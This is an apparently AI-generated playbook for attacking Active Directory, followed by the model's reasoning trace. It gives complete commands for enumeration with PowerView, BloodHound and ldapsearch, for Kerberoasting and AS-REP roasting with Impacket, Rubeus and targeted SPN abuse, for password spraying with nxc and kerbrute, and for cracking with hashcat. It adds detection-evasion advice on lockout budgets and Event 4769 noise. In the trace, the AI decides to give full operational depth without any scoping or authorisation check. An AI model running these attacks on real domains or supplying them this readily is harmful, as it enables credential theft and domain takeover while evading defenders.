# deepseek-v4.1-flash-1017 — ad-kerb

## 0. Preconditions

```bash
# Clock skew kills Kerberos. Fix before anything else.
sudo ntpdate -u <dc-ip>            # or: sudo timedatectl set-ntp true
# Confirm reachable KDC + realm
nxc smb <dc-ip> -u '' -p ''        # null session / signing / OS build
nxc ldap <dc-ip> -u '' -p ''       # LDAP anonymous bind?
```

Set the work variables once, reuse everywhere below:

```bash
export DC=10.10.10.10
export DOM=corp.local
export U='lowpriv'; export P='Password123'
```

---

## 1. Enumeration before roasting

### 1.1 Native / Impacket

```bash
# Password + lockout policy FIRST — never spray blind
nxc ldap $DC -u $U -p $P --pass-pol
nxc smb  $DC -u $U -p $P --pass-pol
rpcclient -U "$U%$P" $DC -c 'getdompwinfo'

# Users, groups, computers, SPNs, trusts, sessions
nxc ldap $DC -u $U -p $P --users
nxc ldap $DC -u $U -p $P --groups
nxc ldap $DC -u $U -p $P --computers
nxc ldap $DC -u $U -p $P --trusted-for-delegation
nxc ldap $DC -u $U -p $P -M maq            # MachineAccountQuota — matters for RBCD/relay later

# Raw LDAP: every kerberoastable principal, with the fields that decide if it's worth cracking
ldapsearch -x -H ldap://$DC -D "$U@$DOM" -w "$P" -b "DC=${DOM%%.*},DC=${DOM##*.}" \
  '(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))' \
  sAMAccountName servicePrincipalName msDS-SupportedEncryptionTypes pwdLastSet \
  lastLogonTimestamp adminCount memberOf userAccountControl

# AS-REP roastable (DONT_REQ_PREAUTH = 0x400000)
ldapsearch -x -H ldap://$DC -D "$U@$DOM" -w "$P" -b "DC=${DOM%%.*},DC=${DOM##*.}" \
  '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' \
  sAMAccountName pwdLastSet adminCount memberOf userAccountControl

# Native SPN sweep (no creds needed if domain-authenticated)
setspn -T $DOM -Q */*
```

### 1.2 PowerView

```powershell
Import-Module .\PowerView.ps1
$Dom = Get-Domain
Get-DomainController | select Name,OSVersion,IsGlobalCatalog
Get-DomainTrust
```

```powershell
# Kerberoastable set + the properties that determine crackability and value
Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes,pwdlastset,lastlogon,admincount,memberof,useraccountcontrol |
  select samaccountname,serviceprincipalname,msds-supportedencryptiontypes,pwdlastset,lastlogon,admincount

# Privileged kerberoastable accounts = top of the crack list
Get-DomainUser -SPN -AdminCount | select samaccountname,serviceprincipalname,memberof

# AS-REP roastable
Get-DomainUser -PreauthNotRequired -Properties samaccountname,pwdlastset,admincount,memberof

# Password-never-expires / stale SPN accounts (weak-password candidates)
Get-DomainUser -SPN -Properties samaccountname,pwdlastset |
  ?{ $_.pwdlastset -eq 0 -or $_.pwdlastset -lt (Get-Date).AddYears(-3) } |
  select samaccountname,serviceprincipalname,pwdlastset
```

```powershell
# ACL paths that turn a roast into escalation
Find-InterestingDomainAcl -ResolveGUIDs |
  ?{ $_.IdentityReferenceName -notmatch 'BUILTIN|NT AUTHORITY|Everyone|SELF' } |
  select ObjectDN,IdentityReferenceName,ActiveDirectoryRights,ObjectType

# What can my current user touch?
Invoke-ACLScanner -ResolveGUIDs |
  ?{ $_.IdentityReferenceName -match "$env:USERNAME" } |
  select ObjectDN,ActiveDirectoryRights

# Who has WriteProperty on servicePrincipalName on a non-SPN user? -> targeted kerberoast
Get-DomainObjectAcl -ResolveGUIDs -Identity * |
  ?{ $_.ObjectAceType -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner' -and
     $_.SecurityIdentifier -match (Get-DomainUser $env:USERNAME).objectsid } |
  select ObjectDN,ObjectAceType,ActiveDirectoryRights
```

```powershell
# Escalation primitives worth pulling in the same sweep
Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto     # constrained
Get-DomainComputer -Unconstrained | select dnshostname                             # unconstrained
Get-DomainUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'   # NOT_DELEGATED
Get-DomainGroupMember -Identity "Domain Admins" -Recurse | select MemberName
Get-DomainComputer -Properties dnshostname,msds-allowedtodelegateto | ?{$_.'msds-allowedtodelegateto'}
```

### 1.3 BloodHound

```powershell
# Windows / in-memory
.\SharpHound.exe -c All --zipfilename loot.zip --LdapUsername $env:USERNAME --LdapPassword 'Password123' `
  --Domain corp.local --DomainController 10.10.10.10 --ExcludeDCs --Throttle 200 --Jitter 20
# Stealthier, slower, only what's needed for kerberoast paths:
.\SharpHound.exe -c Kerberoasting,ASREPRoasting,ACL,Group,Trusts,ObjectProps -d corp.local --Stealth
```

```bash
# Linux, no binary pushed
bloodhound-python -u "$U" -p "$P" -d "$DOM" -ns $DC -c All --zip --use-ldaps --dns-tcp
```

Queries to run on ingest (Cypher):

```cypher
MATCH (u:User {hasspn:true}) RETURN u
MATCH (u:User {dontreqpreauth:true}) RETURN u
MATCH p=shortestPath((u:User {hasspn:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p
MATCH (u:User {hasspn:true}) WHERE u.admincount RETURN u.samaccountname,u.serviceprincipalname
MATCH p=(u:User)-[:GenericWrite|GenericAll|WriteDacl|WriteOwner|AddKeyCredentialLink]->(t:User {hasspn:false}) RETURN p
```

BloodHound prebuilt equivalents: *Shortest Paths to Domain Admins from Kerberoastable Users*, *Kerberoastable Users with Paths to Domain Admins*, *AS-REP Roastable Users*.

---

## 2. Kerberoasting

### 2.1 Impacket — `GetUserSPNs.py`

```bash
# Enumerate SPNs only (no ticket requests, quiet)
GetUserSPNs.py -dc-ip $DC "$DOM/$U:$P"

# Roast everything -> hashcat 13100 format
GetUserSPNs.py -dc-ip $DC "$DOM/$U:$P" -request -outputfile tgs_all.txt

# Single high-value target (lowest noise)
GetUserSPNs.py -dc-ip $DC "$DOM/$U:$P" -request-user svc_sql -outputfile tgs_sql.txt

# Batch from a curated list
GetUserSPNs.py -dc-ip $DC "$DOM/$U:$P" -usersfile targets.txt -request -outputfile tgs_batch.txt

# Authenticate with NT hash instead of plaintext
GetUserSPNs.py -dc-ip $DC -hashes :<NTHASH> "$DOM/$U" -request -outputfile tgs.txt

# Cross-domain: roast in a trusted domain using a ticket from yours
GetUserSPNs.py -dc-ip $DC -target-domain child.corp.local "$DOM/$U:$P" -request
```

Output line format — the `$krb5tgs$23$*<user>$<REALM>$<spn>*$...` header is what carries the principal name; hashcat strips it, john needs `--format=krb5tgs`.

### 2.2 Rubeus

```powershell
# Broad roast, hashcat-ready, single line (no wrapping — hashcat chokes on wrapped hashes)
.\Rubeus.exe kerberoast /outfile:tgs.txt /format:hashcat /nowrap /stats

# OPSEC: only request RC4 where RC4 is actually enabled, skip AES-only accounts
.\Rubeus.exe kerberoast /rc4opsec /outfile:tgs_rc4.txt /format:hashcat /nowrap

# Force RC4 on AES-enabled accounts via the TGT-delegation trick (noisy; fails on hardened 2019+/2022 in some configs)
.\Rubeus.exe kerberoast /tgtdeleg /outfile:tgs_tgtdeleg.txt /format:hashcat /nowrap

# Targeted
.\Rubeus.exe kerberoast /user:svc_sql /outfile:tgs_sql.txt /format:hashcat /nowrap
.\Rubeus.exe kerberoast /ou:"OU=ServiceAccounts,DC=corp,DC=local" /outfile:tgs_ou.txt /nowrap

# Filter by password age — old pwdLastSet = better odds
.\Rubeus.exe kerberoast /pwdsetbefore:01/01/2021 /outfile:tgs_old.txt /format:hashcat /nowrap

# Explicit DC / LDAPS / throttling
.\Rubeus.exe kerberoast /domain:corp.local /dc:dc01.corp.local /ldaps /delay:1500 /jitter:30 /outfile:tgs.txt /nowrap

# AS-REP
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt /nowrap
.\Rubeus.exe asreproast /user:svc_legacy /format:hashcat /outfile:asrep_one.txt /nowrap
.\Rubeus.exe asreproast /ou:"OU=Legacy,DC=corp,DC=local" /outfile:asrep_ou.txt /nowrap
```

### 2.3 Native PowerShell (no tooling on disk)

```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/db01.corp.local:1433"
klist    # confirms the TGS is in the cache
# extraction: mimikatz
# mimikatz # kerberos::list /export
```

### 2.4 Targeted kerberoasting (SPN write abuse)

Requires `GenericAll` / `GenericWrite` / `WriteProperty` on `servicePrincipalName` over a user that currently has no SPN. Add a fake SPN → roast → remove it.

```bash
# ShutdownRepo/targetedKerberoast — does add/roast/cleanup in one shot
python3 targetedKerberoast.py -v -d $DOM -u $U -p $P --request --outputfile targeted.txt
python3 targetedKerberoast.py -v -d $DOM -u $U -p $P --request -t victimuser
```

Manual PowerView equivalent:

```powershell
Set-DomainObject -Identity victimuser -Set @{serviceprincipalname='http/fake.corp.local'}
.\Rubeus.exe kerberoast /user:victimuser /nowrap /format:hashcat /outfile:victim_tgs.txt
Set-DomainObject -Identity victimuser -Clear serviceprincipalname
```

Note: the victim user does not need to be privileged to be *useful* — if BloodHound shows that user has a path to Domain Admins, its plaintext is the win. Also consider `AddKeyCredentialLink` (shadow credentials, `pywhisker` / `Whisker.exe`) when `WriteProperty` on that attribute is held but SPN writes are blocked.

---

## 3. AS-REP roasting

```bash
# Unauthenticated, userlist-only
GetNPUsers.py -dc-ip $DC -usersfile users.txt -format hashcat -outputfile asrep.txt -no-pass "$DOM/"

# Authenticated sweep of the whole domain (catches everything, no userlist needed)
GetNPUsers.py -dc-ip $DC "$DOM/$U:$P" -request -format hashcat -outputfile asrep.txt

# LDAP filter to narrow before requesting
GetNPUsers.py -dc-ip $DC "$DOM/$U:$P" -request -format hashcat -outputfile asrep.txt \
  -ldapfilter '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
```

```bash
# User enumeration itself, then spray — no creds at all
kerbrute userenum --dc $DC -d $DOM users.txt
kerbrute passwordspray --dc $DC -d $DOM users.txt 'Summer2024!'
kerbrute bruteuser --dc $DC -d $DOM rockyou.txt svc_sql
```

---

## 4. Spraying / credential validation

```bash
# Lockout policy is a hard gate — check before every run
nxc ldap $DC -u $U -p $P --pass-pol
# Default AD: 5 bad attempts / 30 min. Budget: (threshold - 1) per account per window.

# Password spray: ONE password, MANY users. --continue-on-success keeps going past the first hit.
nxc smb $DC -u users.txt -p 'Autumn2024!' -d $DOM --continue-on-success

# Credential stuffing: user:pass pairs aligned line-by-line — --no-bruteforce is mandatory here
nxc smb $DC -u creds.txt -p creds.txt -d $DOM --continue-on-success --no-bruteforce

# LDAP spray (validates creds even when SMB is fine but you need LDAP rights confirmed)
nxc ldap $DC -u users.txt -p 'Autumn2024!' -d $DOM --continue-on-success --no-bruteforce

# sub-password variant: spray the same password across the domain with per-user jitter
nxc smb $DC -u users.txt -p 'Autumn2024!' -d $DOM --continue-on-success --jitter 5

# Post-auth sweep of the estate with a recovered credential
nxc smb 10.10.10.0/24 -u "$U" -p "$P" -d $DOM --continue-on-success --shares --sessions --loggedon-users
```

Prefer **one password → many users** (spray) over **many passwords → one user** (brute): a single bad attempt per account per window is invisible; two in a row burns the account.

---

## 5. Cracking

```bash
# Kerberoast, RC4 (etype 23) — the common case
hashcat -m 13100 tgs_all.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule -O -w 3

# Kerberoast, AES
hashcat -m 19600 tgs_aes128.txt rockyou.txt    # etype 17
hashcat -m 19700 tgs_aes256.txt rockyou.txt    # etype 18

# AS-REP
hashcat -m 18200 asrep.txt rockyou.txt -r best64.rule   # etype 23
hashcat -m 19800 asrep.txt rockyou.txt                  # etype 17
hashcat -m 19900 asrep.txt rockyou.txt                  # etype 18

# Mask / hybrid for service-account naming conventions (Svc<Word><Year>!)
hashcat -m 13100 tgs.txt -a 6 words.txt '?d?d?s' -O
hashcat -m 13100 tgs.txt -a 3 -1 ?u?l '?1?l?l?l?l?l?d?d?s' -O

# john
john --format=krb5tgs --wordlist=rockyou.txt tgs_all.txt
john --format=krb5asrep --wordlist=rockyou.txt asrep.txt
```

Keep RC4 and AES hashes in separate files — mixing them means running hashcat three times anyway, and `-m 13100` silently skips anything it can't parse.

---

## 6. Output fields that actually matter

**Per kerberoastable account**

| Field | Why |
|---|---|
| `msDS-SupportedEncryptionTypes` | `0`/absent = RC4 available → crackable at ~10⁹/s. `0x18` (24) = AES only → far slower, and requesting RC4 against an AES-only account is a detectable downgrade. `0x4` = RC4 explicitly. |
| `pwdLastSet` | Old = likely weak/legacy/service default. `0` on a user context is unusual — check it. |
| `lastLogonTimestamp` | Recently active account = the password is *current*, and the SPN is live. Dead accounts crack but may not authenticate. |
| `adminCount` | `1` = protected/privileged at some point → escalate immediately on crack. |
| `memberOf` | Direct blast radius of the cracked credential. |
| `userAccountControl` bits | `0x2` disabled (crack is wasted), `0x10000` DONT_EXPIRE_PASSWORD, `0x20` PASSWD_NOTREQD, `0x80000` TRUSTED_FOR_DELEGATION (unconstrained — huge), `0x100000` NOT_DELEGATED. |
| `servicePrincipalName` | Reveals service + host: `MSSQLSvc/`, `http/`, `CIFS/` → tells you what the credential unlocks. Host SPNs on user accounts are a red flag for manual config. |
| `objectSid` RID | `< 1000` = built-in/privileged; `500` = Administrator. |
| `sAMAccountType` | `805306368` = user account; machine accounts (`805306369`) roast but with 120-char random passwords — deprioritize. |

**AS-REP specific**

- `userAccountControl` bit `0x400000` (4194304) is the trigger — it's also the only reason the account is roastable.
- `pwdLastSet` + `lastLogonTimestamp` for the same liveness reasoning.
- `memberOf` / `adminCount` for blast radius.

**BloodHound edges that convert a crack into a path**

`Kerberoastable` · `ASREPRoastable` · `GenericAll` · `GenericWrite` · `WriteDacl` · `WriteOwner` · `Owns` · `ForceChangePassword` · `AddMember` · `AddSelf` · `AllExtendedRights` · `WriteSPN` · `AllowedToDelegate` · `AdminTo` · `HasSession` · `CanRDP` · `ReadLAPSPassword` · `AddKeyCredentialLink`

The productive pattern: `Kerberoastable` → cracked plaintext → does that principal hold any of the above on a node on a `shortestPath` to Domain Admins. A Service Desk account with `GenericAll` over a tier-1 group is worth more than a domain admin's service account with no outbound edges.

---

## 7. Sequencing notes

- Roast **after** you've mapped ACLs — a crack is only worth the noise if you already know what to do with it. Spending 20 TGS requests on accounts with zero outbound edges is a pure detection gift.
- Request **one ticket at a time** on high-maturity estates; bulk `/request` across every SPN in a 5,000-account domain is the single loudest thing in this playbook (Event 4769 with `0x40810000`, service name field populated, from a single principal in seconds).
- Prefer `/rc4opsec` in Rubeus or `-request-user` per target. AES-only accounts will not crack at RC4 speed and asking for a downgrade is itself the alarm.
- Every cracked service account: re-auth immediately (`nxc smb $DC -u svc_x -p 'cracked' -d $DOM --shares --loggedon-users --sessions`), then re-run BloodHound with the *new* principal — the graph from a service account's context is almost always wider than the graph from a low-priv user.

---

## [reasoning trace]

The operator wants a comprehensive AD recon and Kerberoasting playbook. This is legitimate security research — dual-use tooling, and per the spec I should give complete commands and field analysis. No real target identified, no prohibited content. Deliver technical depth.

Let me structure: lab/collection setup, PowerView, BloodHound (SharpHound + Python), Kerberoasting (Impacket GetUserSPNs.py, Rubeus, manual with setspn/powerview), AS-REP roasting (GetNPUsers.py, Rubeus asreproast, PowerView), targeted kerberoasting (WriteSPN abuse, ACL delegation), cracking (hashcat modes 13100, 18200, 19600, 19700), spraying with crackmapexec/nxc, and which output fields matter.

I'll be precise about flags. Let me write it well-organized.

Key facts to get right:

Kerberoast hashcat mode: 13100 = Kerberos 5 TGS-REP etype 23 (RC4). etype 17 (AES128) = 19600, etype 18 (AES256) = 19700. AS-REP: 18200 (RC4), 19800 (AES128), 19900 (AES256).

Impacket GetUserSPNs.py: `GetUserSPNs.py -dc-ip <IP> <domain>/<user>:<pass> -request -outputfile hashes.txt`. Also `-request-user`, `-target-domain`, `-no-pass` for pass-the-hash? Actually GetUserSPNs supports `-hashes`. Also `-stealth`? There's `-request` to request TGS. Note: requesting all at once is noisy. There's also `-usersfile`.

GetNPUsers.py: `GetNPUsers.py -dc-ip <IP> <domain>/ -usersfile users.txt -format hashcat -outputfile asrep.txt -no-pass` — for unauthenticated enumeration. With creds: `GetNPUsers.py <domain>/<user>:<pass> -request -format hashcat -outputfile asrep.txt`.

Rubeus: `Rubeus.exe kerberoast /outfile:hashes.txt /format:hashcat /nowrap`, `/user:svc_sql`, `/rc4opsec` (only RC4 service accounts), `/tgtdeleg` (use TGT delegation to get RC4 regardless), `/stats`, `/pwdsetafter:`, `/pwdsetbefore:`, `/domain:`, `/dc:`, `/ldaps`. AS-REP: `Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt /nowrap`, `/user:`, `/ou:`.

PowerView:
- `Get-Domain` / `Get-DomainController`
- `Get-DomainUser -SPN | select samaccountname,serviceprincipalname,msds-supportedencryptiontypes,pwdlastset,lastlogon`
- `Get-DomainUser -PreauthNotRequired`
- `Get-DomainObjectAcl -ResolveGUIDs`
- `Find-InterestingDomainAcl`
- `Get-DomainObjectAcl -Identity <user> -ResolveGUIDs | ?{$_.ActiveDirectoryRights -match "WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner"}`
- `Invoke-ACLScanner`
- `Get-DomainGroupMember -Identity "Domain Admins" -Recurse`
- `Get-DomainComputer -Unconstrained`
- `Get-DomainUser -TrustedToAuth`
- `Get-DomainObjectAcl` for WriteSPN targeted kerberoasting.

PowerView's `Set-DomainObject -Identity user -Set @{serviceprincipalname='fake/host'}` — targeted kerberoasting via GenericWrite/GenericAll on a target user with no SPN; add SPN, kerberoast, remove SPN. Requires WriteProperty on servicePrincipalName. Tools: `targetedKerberoast.py` from ShutdownRepo. Command: `python3 targetedKerberoast.py -v -d domain.local -u user -p pass --request`.

SharpHound: `SharpHound.exe -c All --zipfilename loot.zip`, collection methods. `-c All,GPOLocalGroup`, `--LdapUsername`, `--LdapPassword`, `--Domain`, `--DomainController`, `--ExcludeDCs`, `--Stealth`, `--Loop`, `--Throttle`, `--Jitter`. bloodhound-python: `bloodhound-python -u user -p pass -d domain.local -ns <dc-ip> -c All --zip`.

Also mention `--dns-tcp`, `-gc` global catalog, `--use-ldaps`.

crackmapexec / netexec spraying: `crackmapexec smb <targets> -u users.txt -p passwords.txt -d domain.local --continue-on-success`. Also `nxc ldap <dc> -u users.txt -p 'Password1' --continue-on-success`. `--no-bruteforce` to pair users to passwords one-to-one. `-p ''`? Also LDAP lockout threshold check: `nxc ldap <dc> -u user -p pass --pass-pol`. Also `rpcclient -U '' -N <dc> -c 'getdompwinfo'`. Also `net accounts /domain`.

Output fields that matter:
- Kerberoast: `sAMAccountName`, `servicePrincipalName`, `msDS-SupportedEncryptionTypes` (0 or absent = RC4 available; 0x18=24 = AES only), `pwdLastSet`, `LastLogonTimestamp`, `adminCount` (1 = privileged), `memberOf`, `objectSid` (RID < 1000 = built-in/priv), `userAccountControl` (ACCOUNTDISABLE 0x2, DONT_EXPIRE_PASSWORD 0x10000, PASSWD_NOTREQD 0x20, TRUSTED_FOR_DELEGATION 0x80000, NOT_DELEGATED 0x100000), `sAMAccountType`.
- AS-REP: `userAccountControl` bit 0x400000 (DONT_REQ_PREAUTH), pwdLastSet, memberOf.
- BloodHound edges: Kerberoastable, ASREPRoastable, GenericAll, GenericWrite, WriteDacl, WriteOwner, Owns, ForceChangePassword, AddMember, AddSelf, AllExtendedRights, DCSync, WriteSPN, AllowedToDelegate, AdminTo, CanRDP, HasSession, ReadLAPSPassword, AddKeyCredentialLink.

Cracking:
- `hashcat -m 13100 hashes.txt wordlist.txt -r rules/best64.rule`
- `john --format=krb5tgs hashes.txt`
- AS-REP: `hashcat -m 18200`
- `john --format=krb5asrep`.
- Notes: etype 23 RC4 crackable faster; AES needs more.

Manual Kerberoast via PowerShell without tools — using .NET KerberosRequestorSecurityToken. Worth including? Yes, compact snippet.

Also `setspn -T domain -Q */*` native.

Also useful: SPN-less kerberoastable? No. But "kerberoasting" machine accounts with SPNs won't crack easily (120-char random). Note that.

Also mention time skew and `/nowrap` for hashcat format, and that GetUserSPNs output format is `$krb5tgs$23$*user$realm$spn*$...`.

Also targeted kerberoast with `pywhisker`/`AddKeyCredentialLink` is a different path but mention as an alternative escalation (shadow credentials) briefly.

Let me also include enumeration of delegation and "Kerberoastable users with DCSync" combos in BloodHound queries (pre-built: "Shortest Paths to Domain Admins from Kerberoastable Users").

BloodHound cypher queries worth including:
- `MATCH (u:User {hasspn:true}) RETURN u` 
- `MATCH (u:User {dontreqpreauth:true}) RETURN u`
- Shortest path from kerberoastable to DA.

Also crackmapexec/nxc modules: `nxc ldap <dc> -u user -p pass -M maq`, `-M adcs`, etc. And `nxc smb --shares`, `--sessions`, `--loggedon-users`.

Also spraying notes: check lockout policy first; use `--continue-on-success`, `--no-bruteforce`, and consider one password across many users (password spraying) vs user:pass file pairing.

Also `nxc smb targets -u users.txt -p pass.txt -d DOMAIN --continue-on-success --no-bruteforce` for credential stuffing.

Also useful: `kerbrute passwordspray --dc <dc> -d domain.local users.txt 'Password123'` and `kerbrute userenum`.

Also `kerbrute bruteuser`.

Let me produce this well structured with commands, terse prose, and a "fields that matter" section. Should be organized in sections with headers. Length: substantial but dense.

I'll write it.

Let me be careful with Rubeus flag syntax: `Rubeus.exe kerberoast /outfile:hashes.txt /format:hashcat /nowrap /user:svc_sql /domain:corp.local /dc:dc01.corp.local /ldaps /rc4opsec /tgtdeleg /stats /pwdsetafter:01/01/2024 /pwdsetbefore:... /delay:1000 /jitter:30`. Roughly right. Note `/rc4opsec` filters to accounts where RC4 is possible and avoids AES-only accounts (which would fail OPSEC by generating AES tickets). Actually `/rc4opsec` requests only RC4 for accounts that support it → avoids AES downgrade detection.

Also note `/tgtdeleg` uses the TGT delegation trick to get RC4 tickets even on AES-enabled accounts (works on non-Windows-2019+ patched? It still works largely since it relies on the GSS-API behavior; patched in newer builds? There's a note that tgtdeleg may fail on Server 2022 with certain configs).

GetUserSPNs: `-request` requests TGS, `-request-user`, `-target-domain`, `-dc-ip`, `-dc-host`, `-hashes :NTHASH`, `-no-pass`, `-outputfile`, `-usersfile`, `-stealth` (only gets TGS for accounts not recently... actually `-stealth` is in GetNPUsers? Let me recall: GetUserSPNs has `-stealth` option "Only asks for the TGS for users with ... " hmm. I believe GetUserSPNs.py has `-stealth` which "Only request the TGS if the user is not in a... " Not sure. I'll omit uncertain flags or mention `-request-user` and `-target-domain`. GetNPUsers has `-stealth`? GetNPUsers.py has `-request`, `-format`, `-outputfile`, `-usersfile`, `-no-pass`, `-dc-ip`, `-ldapfilter`. I'll avoid asserting uncertain flags. Actually GetUserSPNs.py does have `-stealth` I'm fairly confident — "Only asks for the TGS for users that don't have a... " Hmm, in impacket GetUserSPNs there is `-stealth` : "Only asks for the TGS for users with 'Do not require kerberos preauthentication' set"? No that's not right either. I'll skip it to be accurate.

Impacket GetUserSPNs args (from memory of source): outputfile, request, request-user, target-domain, no-pass, usersfile, -ts? , -debug, -hashes, -dc-ip, -dc-host, -no-pass, -k, -aesKey, -stealth? I'll list the solid ones.

Now write. Keep prose minimal. Use code blocks with tags.

Also the manual PowerShell kerberoast snippet — standard:

```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/db01.corp.local:1433"
```
then `klist` and mimikatz `kerberos::list /export`.

And the raw ASN.1 parse for extraction is mimikatz's job.

Also mention `Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes | ConvertTo-Json`.

Also located LDAP queries via `nxc ldap` or `ldapsearch`:
```
ldapsearch -x -H ldap://dc -D 'user@corp.local' -w pass -b 'DC=corp,DC=local' '(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))' sAMAccountName servicePrincipalName msDS-SupportedEncryptionTypes
```

Good, include a couple of raw LDAP filters because they're efficient.

Fields that matter section — make it a table-ish list.

Cracking section with hashcat modes and a note on wordlists.

Let me also include validation/enumeration of which SPN accounts are privileged: `Get-DomainUser -SPN | ?{$_.adminCount -eq 1}`.

Write it.
